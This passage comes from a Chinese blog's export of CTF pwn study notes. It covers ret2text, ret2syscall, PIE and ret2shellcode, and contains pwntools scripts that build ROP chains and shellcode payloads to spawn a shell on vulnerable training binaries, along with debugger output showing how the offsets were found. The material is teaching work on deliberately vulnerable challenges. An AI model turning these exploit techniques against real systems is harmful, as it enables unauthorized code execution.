class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn2&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&quot;gz.imxbt.cn&quot;</span>,<span class="number">20159</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">bin_sh=<span class="number">0x402008</span></span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x401196</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>)+p64(pop_rdi_ret)+p64(bin_sh)+p64(ret)+p64(system_plt)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">+-----------------------------+</span><br><span class="line">|system@plt 地址               |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| ret 地址    0x40101a         |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| &quot;/bin/sh&quot; 地址    0x402008   |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| pop rdi; ret 地址   0x401196 |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|覆盖的ebp (8字节)(通常为垃圾值)   |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|填充数据 (0x70字节) b&#x27;a&#x27; * 0x70 |</span><br><span class="line">+-----------------------------+</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> BaseCTF2024新生赛 </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3-ret2syscall</title>
      <link href="/2025/07/1911a7f94587.html"/>
      <url>/2025/07/1911a7f94587.html</url>
      
        <content type="html"><![CDATA[<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p>继续以 bamboofox 中的 ret2syscall 为例。</p><blockquote><p>点击下载: <a href="../../../../../../../challenges/ret2syscall">ret2syscall</a></p></blockquote><p>首先检测程序开启的保护：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec ret2syscall</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 进行反编译：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;);</span><br><span class="line">  puts(&quot;What do you plan to do?&quot;);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。</p><p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure><p>其中，该程序是 32 位，所以我们需要使得</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>而我们如何控制这些寄存器的值呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><p>首先，我们来寻找控制 eax 的 gadgets</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span></span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。</p><p>类似的，我们可以得到控制其它寄存器的 gadgets</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;ebx&#x27;</span></span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>这里，我选择</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>这个可以直接控制其它三个寄存器。</p><p>此外，我们需要获得 &#x2F;bin&#x2F;sh 字符串对应的地址。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall  --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure><p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall  --only <span class="string">&#x27;int&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080890b5 : int 0xcf</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 2</span><br></pre></td></tr></table></figure><p>同时，也找到对应的地址了。</p><p>下面就是对应的 payload，<code>其中 0xb 为 execve 对应的系统调用号</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2syscall&#x27;</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 列表形式（按顺序拼接）</span><br><span class="line">python</span><br><span class="line">运行</span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>,         <span class="comment"># 填充缓冲区</span></span><br><span class="line">    pop_eax_ret,        <span class="comment"># 地址（自动转换为p64/p32）</span></span><br><span class="line">    <span class="number">0xb</span>,                <span class="comment"># 整数值（自动转换为p64/p32）</span></span><br><span class="line">    pop_edx_ecx_ebx_ret,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, binsh,        <span class="comment"># execve(&quot;/bin/sh&quot;, NULL, NULL)</span></span><br><span class="line">    int_0x80            <span class="comment"># 系统调用地址</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 字典形式（按偏移量填充）</span><br><span class="line">python</span><br><span class="line">运行</span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    <span class="number">0</span>: <span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>,       <span class="comment"># 从偏移0开始填充</span></span><br><span class="line">    <span class="number">112</span>: pop_eax_ret,    <span class="comment"># 从偏移112开始放地址</span></span><br><span class="line">    <span class="number">120</span>: <span class="number">0xb</span>,            <span class="comment"># 从偏移120开始放整数</span></span><br><span class="line">    <span class="number">128</span>: pop_edx_ecx_ebx_ret,</span><br><span class="line">    <span class="number">136</span>: [<span class="number">0</span>, <span class="number">0</span>, binsh],  <span class="comment"># 列表会按顺序拼接</span></span><br><span class="line">    <span class="number">160</span>: int_0x80</span><br><span class="line">&#125;)</span><br><span class="line">等价于</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(binsh)+p32(int_0x80)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2syscall&#x27;</span>: pid 379</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">This <span class="keyword">time</span>, no system() and NO SHELLCODE!!!</span><br><span class="line">What <span class="keyword">do</span> you plan to <span class="keyword">do</span>?</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag  exp.py  pwn  ret2libc1  ret2libc2  ret2libc3  ret2syscall</span><br></pre></td></tr></table></figure><h3 id="题目-¶"><a href="#题目-¶" class="headerlink" title="题目 ¶"></a>题目 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/rop">¶</a></h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ul><li>train.cs.nctu.edu.tw: ret2libc</li></ul><p>[ret2text]: </p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 6-栈溢出与ROP </category>
          
          <category> Stack Overflow </category>
          
          <category> x86x64 </category>
          
          <category> 3-基本ROP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/1b441f252dcf.html"/>
      <url>/2025/07/1b441f252dcf.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 5-Linux安全机制 </category>
          
          <category> 4-ASLR和PIE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PIE</title>
      <link href="/2025/07/dda2949b06fa.html"/>
      <url>/2025/07/dda2949b06fa.html</url>
      
        <content type="html"><![CDATA[<p>由于ASLR是一种操作系统层面的技术，而二进制程序本身是不支持随机化加载的，便出现了些绕过方式，例如ret2plt、GOT劫持、地址爆破等。于是，人们于2003年引入了位置无关可执行文件(Posifion-Independent Bxecutable,PIE),它在应用层的编译器上实现,通过将程序编译为位置无关代码( Position-Independent Code,PIC),使程序可以被加载到任意位置,就像是一个特殊的共享库。在PIE和 ASLR 同时开启的情况下，攻击者将对程序的内存布局一无所知，大大增加了利用难度当然凡事有利也有弊,在增加安全性的同时，PIE也会一定程度上影响性能,因此在大多数操作系统上 PIE 仅用于一些对安全性要求比较高的程序。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 5-Linux安全机制 </category>
          
          <category> 4-ASLR和PIE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2-ret2shellcode</title>
      <link href="/2025/07/bb0d09949d55.html"/>
      <url>/2025/07/bb0d09949d55.html</url>
      
        <content type="html"><![CDATA[<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码</strong>。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><p>需要注意的是，<strong>在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的 ret2shellcode 手法不再能直接完成利用</strong>。</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="第一种利用方式"><a href="#第一种利用方式" class="headerlink" title="第一种利用方式:"></a>第一种利用方式:</h3><p>根据函数调用约定,在一个函数执行的最后,是一个leave;ret;</p><p>实质是</p><p>mov esp,ebp</p><p>pop ebp</p><p>pop eip</p><p>这时候我们在填充一个shellcode,然后控制返回地址为jmp esp即可利用</p><table><thead><tr><th>shellcode</th></tr></thead><tbody><tr><td>jmp esp</td></tr><tr><td>old_ebp</td></tr><tr><td>局部变量</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r  <span class="comment">#不断点直接</span></span><br><span class="line">Starting program: /CTF/ret2shellcode</span><br><span class="line">warning: Error disabling address space randomization: Operation not permitted</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">No system <span class="keyword">for</span> you this <span class="keyword">time</span> !!!</span><br><span class="line">^C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line">0xedc2b579 <span class="keyword">in</span> __kernel_vsyscall ()</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; cyclic 300</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac</span><br><span class="line"><span class="built_in">bye</span> <span class="built_in">bye</span> ~</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x62616164 <span class="keyword">in</span> ?? ()</span><br><span class="line">Warning: Avoided exploring possible address 0xff315755.</span><br><span class="line">You can explicitly explore it with `vmmap-explore 0xff315000`</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────</span><br><span class="line">*EAX  0</span><br><span class="line">*EBX  0xedc0ee34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line">*ECX  0</span><br><span class="line">*EDX  0</span><br><span class="line">*EDI  0xedc60b60 (_rtld_global_ro) ◂— 0</span><br><span class="line">*ESI  0x80485d0 (__libc_csu_init) —▸ 0xff315755 ◂— 0xff315755</span><br><span class="line">*EBP  0x62616163 (<span class="string">&#x27;caab&#x27;</span>)</span><br><span class="line">*ESP  0xffa183b0 ◂— <span class="string">&#x27;eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac&#x27;</span></span><br><span class="line">*EIP  0x62616164 (<span class="string">&#x27;daab&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; cyclic -l daab</span><br><span class="line">Finding cyclic pattern of 4 bytes: b<span class="string">&#x27;daab&#x27;</span> (hex: 0x64616162)</span><br><span class="line">Found at offset 112</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ret2shellcode --only jmp</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080483cb : jmp 0x80483b0</span><br><span class="line">0x08048522 : jmp 0x80484a0</span><br><span class="line">0x08048631 : jmp 0x8048640</span><br><span class="line">0x0804855a : jmp dword ptr [ecx + 0x804a040]</span><br><span class="line">0x0804871f : jmp dword ptr [ecx]</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 5(没找到)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s = process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">jmp_esp = <span class="number">0x08048691</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span>+p32(jmp_esp)+asm(shellcraft.i386.sh())</span><br><span class="line">s.sendline(payload)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure><p>2)第二种利用方式（bss段执行）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s = process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line">payload = asm(shellcode)<span class="comment">#payload=&#x27;\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&#x27;等价(https://www.exploit-db.com/shellcodes)</span></span><br><span class="line">payload = payload.ljust(<span class="number">112</span>,<span class="string">&#x27;A&#x27;</span>)+p32(<span class="number">0x0804A080</span>)</span><br><span class="line">s.sendline(payload)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p>这里我们以 bamboofox 中的 ret2shellcode 为例，需要注意的是，你应当在内核版本较老的环境中进行实验（如 Ubuntu 18.04 或更老版本）。由于容器环境间共享同一内核，因此这里我们无法通过 docker 完成环境搭建。</p><blockquote><p>点击下载: <a href="../../../../../../../challeges/ret2shellcode">ret2shellcode</a></p></blockquote><p>首先检测程序开启的保护：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  checksec ret2shellcode</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。接下来我们再使用 IDA 对程序进行反编译：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure><p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b main</span><br><span class="line">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /CTF/ret2shellcode</span><br><span class="line">warning: Error disabling address space randomization: Operation not permitted</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class="line">warning: 8ret2shellcode.c: No such file or directory</span><br><span class="line">Warning: Avoided exploring possible address 0xff315755.</span><br><span class="line">You can explicitly explore it with `vmmap-explore 0xff315000`</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────</span><br><span class="line"> EAX  0x804852d (main) ◂— push ebp</span><br><span class="line"> EBX  0xee6c5e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line"> ECX  0x37629d76</span><br><span class="line"> EDX  0xff906340 —▸ 0xee6c5e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line"> EDI  0xee717b60 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80485d0 (__libc_csu_init) —▸ 0xff315755 ◂— 0xff315755</span><br><span class="line"> EBP  0xff906318 ◂— 0</span><br><span class="line"> ESP  0xff906290 —▸ 0xee718b8c —▸ 0xee6dc6f0 —▸ 0xee718a20 ◂— 0</span><br><span class="line"> EIP  0x8048536 (main+9) ◂— mov eax, dword ptr [0x804a060]</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line"> Start        End Perm     Size  Offset File (<span class="built_in">set</span> vmmap-prefer-relpaths on)</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000       0 ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000       0 ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000    1000 ret2shellcode</span><br><span class="line">0xee495000 0xee4b8000 r--p    23000       0 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xee4b8000 0xee63f000 r-xp   187000   23000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xee63f000 0xee6c4000 r--p    85000  1aa000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xee6c4000 0xee6c6000 r--p     2000  22f000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xee6c6000 0xee6c7000 rw-p     1000  231000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xee6c7000 0xee6d1000 rw-p     a000       0 [anon_ee6c7]</span><br><span class="line">0xee6dc000 0xee6de000 rw-p     2000       0 [anon_ee6dc]</span><br><span class="line">0xee6de000 0xee6e2000 r--p     4000       0 [vvar]</span><br><span class="line">0xee6e2000 0xee6e4000 r-xp     2000       0 [vdso]</span><br><span class="line">0xee6e4000 0xee6e5000 r--p     1000       0 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xee6e5000 0xee708000 r-xp    23000    1000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xee708000 0xee716000 r--p     e000   24000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xee716000 0xee718000 r--p     2000   31000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xee718000 0xee719000 rw-p     1000   33000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xff8e7000 0xff908000 rwxp    21000       0 [stack]</span><br></pre></td></tr></table></figure><p>通过 vmmap，我们可以看到 bss 段对应的段不可执行权限(所以复现不了)：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0x804a000  0x804b000 rw-p     1000    1000 ret2shellcode</span><br></pre></td></tr></table></figure><p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p><ul><li>缓冲区大小: 100 字节</li><li>EBP 偏移: 0x6C (108 字节)</li><li>返回地址位置: EBP + 4</li><li>总偏移量 &#x3D; 0x6C + 4 &#x3D; <strong>112 字节</strong></li></ul><p>最后的 payload 如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shell&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment">#生成执行/bin/s的汇编代码（字符串形式）</span></span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<span class="comment">#将 shellcode 填充到 112 字节，不足部分用 b&#x27;A&#x27; 补足</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><blockquote><p>点击下载: <a href="../../../../../../../challeges/b0verfl0w">b0verfl0w</a></p></blockquote><p>Checksec 查看保护</p><figure class="highlight bash"><table><tr><td 